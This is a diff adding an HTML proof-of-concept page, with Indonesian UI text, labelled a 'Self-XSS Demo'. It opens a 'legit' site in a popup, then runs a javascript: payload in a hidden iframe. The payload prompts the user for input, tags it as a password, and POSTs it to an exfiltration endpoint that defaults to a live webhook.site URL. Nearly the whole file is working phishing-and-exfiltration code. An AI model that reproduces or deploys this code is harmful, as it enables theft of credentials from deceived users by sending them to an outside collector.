@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>PoC: iframe + javascript: payload + POST exfil</title>
+  <style>
+    :root { color-scheme: dark; }
+    body { margin:0; padding:32px; font-family: system-ui, Arial, sans-serif; background:#0b0b0b; color:#eaeaea; }
+    h1 { margin:0 0 8px; color:#4ade80; font-size:22px; }
+    p { margin:0 0 16px; opacity:.9; }
+    .row { display:flex; gap:12px; flex-wrap:wrap; margin:16px 0 8px; }
+    label { display:flex; flex-direction:column; gap:6px; font-size:13px; }
+    input[type="text"] { width:360px; max-width:100%; padding:10px 12px; border-radius:10px; border:1px solid #2a2a2a; background:#121212; color:#eaeaea; }
+    button {
+      padding:12px 18px; border-radius:12px; border:1px solid #333;
+      background:#1a1a1a; color:#fff; cursor:pointer; font-weight:600;
+    }
+    button:hover { background:#222; }
+    #status {
+      margin-top:16px; padding:12px; border-radius:12px; background:#101010; border:1px solid #1e1e1e;
+      font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; white-space:pre-wrap; min-height:60px;
+    }
+    .note { margin-top:10px; font-size:12px; opacity:.75; }
+  </style>
+</head>
+<body>
+  <h1>Self-XSS Demo: Prompt → POST Exfil via Hidden iframe</h1>
+  <p>Klik tombol di bawah. PoC akan membuka domain “legit” (opsional), lalu 2 detik kemudian menjalankan payload <code>javascript:</code> di <em>iframe</em> same-origin untuk memunculkan <code>prompt()</code> dan mengirim nilainya via <code>POST</code>.</p>
+
+  <div class="row">
+    <label>Legit URL (opsional)
+      <input id="legitUrl" type="text" value="https://example.com/">
+    </label>
+    <label>Exfil URL (wajib)
+      <input id="exfilUrl" type="text" value="https://webhook.site/46a1ff0d-65fb-41b4-a384-0ed267ed2a90/submit">
+    </label>
+  </div>
+
+  <button id="runBtn">Jalankan Demo</button>
+  <div id="status">Status: siap.</div>
+  <div class="note">Tip: Kalau popup diblokir, PoC tetap jalan tanpa jendela “legit”.</div>
+
+  <script>
+    const $run = document.getElementById('runBtn');
+    const $status = document.getElementById('status');
+    const log = (msg) => { $status.textContent = (typeof msg === 'string' ? msg : JSON.stringify(msg)) + "\n" + $status.textContent; };
+
+    $run.onclick = () => {
+      const LEGIT_URL = document.getElementById('legitUrl').value.trim();
+      const EXFIL_URL = document.getElementById('exfilUrl').value.trim();
+
+      if (!EXFIL_URL) {
+        log('Exfil URL kosong. Isi dulu, ya.');
+        return;
+      }
+
+      log('Memulai… membuka legit URL (opsional).');
+      let win = null;
+      try { if (LEGIT_URL) win = window.open(LEGIT_URL, '_blank'); } catch (e) {}
+      if (!win) log('Popup diblokir / tidak dibuat. Lanjut tanpa popup.');
+
+      // Step 2: 2 detik kemudian buat iframe hidden dan jalankan payload javascript:
+      setTimeout(() => {
+        log('Menyuntik iframe same-origin + payload javascript: …');
+        const iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        document.body.appendChild(iframe);
+
+        // Payload: prompt → kirim via FORM POST di dalam iframe
+        // Gunakan kutip tunggal di dalam string agar mudah di-embed.
+        const payload =
+          "javascript:(function(){"
+          + " setTimeout(function(){"
+          + "   var p = prompt('Halo dunia');"
+          + "   if(p){"
+          + "     try{ parent.postMessage({type:'poc_password', value:p}, '*'); }catch(e){}"
+          + "     var d=document; var f=d.createElement('form'); f.method='POST'; f.action='" + EXFIL_URL.replace(/'/g, "%27") + "';"
+          + "     var i=d.createElement('input'); i.type='hidden'; i.name='password'; i.value=p; f.appendChild(i);"
+          + "     d.body.appendChild(f); f.submit();"
+          + "   }"
+          + " }, 1000);"
+          + "})();";
+
+        // Set src ke javascript: payload
+        iframe.src = payload;
+
+        // Terima data dari iframe (pre-submit) via postMessage
+        const onMsg = (ev) => {
+          if (!ev || !ev.data || ev.data.type !== 'poc_password') return;
+          log('Captured (postMessage): ' + ev.data.value);
+          cleanup();
+        };
+        window.addEventListener('message', onMsg);
+
+        // Safety cleanup 6 detik
+        const guard = setTimeout(cleanup, 6000);
+
+        function cleanup() {
+          clearTimeout(guard);
+          window.removeEventListener('message', onMsg);
+          try { if (iframe && iframe.parentNode) iframe.parentNode.removeChild(iframe); } catch (e) {}
+          try { if (win && !win.closed) win.close(); } catch (e) {}
+          log('Selesai. (iframe & popup dibersihkan)');
+        }
+      }, 2000);
+    };
+  </script>
+</body>
+</html>
